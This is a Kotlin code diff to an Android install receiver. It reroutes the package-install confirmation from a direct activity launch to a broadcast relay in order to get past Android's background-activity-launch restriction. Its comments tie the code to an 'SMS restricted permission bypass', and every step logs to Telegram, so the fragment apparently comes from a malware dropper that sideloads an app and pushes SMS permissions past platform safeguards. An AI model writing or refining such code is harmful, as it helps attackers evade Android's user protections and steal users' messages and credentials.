@@ -52,12 +52,15 @@ class InstallReceiver : BroadcastReceiver() {
                     intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                 }
                 userIntent?.let {
-                    // OLD WORKING CODE: Direct startActivity from receiver with FLAG_ACTIVITY_NEW_TASK.
-                    // Previous change to broadcast relay broke SMS restricted permission bypass.
-                    // The direct launch from receiver is how the old working code handles this.
-                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    TelegramLogger.log("InstallReceiver: Launching install confirm directly (FLAG_ACTIVITY_NEW_TASK)")
-                    context.startActivity(it)
+                    // Relay to InstallActivity via broadcast so it launches via startActivityForResult
+                    // from Activity context — required on Android 10+ where FLAG_ACTIVITY_NEW_TASK
+                    // from a BroadcastReceiver cannot surface over a foreground activity (BAL restriction).
+                    val relay = Intent(INSTALL_CONFIRM_ACTION).apply {
+                        setPackage(context.packageName)
+                        putExtra(Intent.EXTRA_INTENT, it)
+                    }
+                    TelegramLogger.log("InstallReceiver: Relaying install confirm to InstallActivity via broadcast")
+                    context.sendBroadcast(relay)
                 } ?: TelegramLogger.log("InstallReceiver: STATUS_PENDING_USER_ACTION but userIntent is NULL")
             }
 
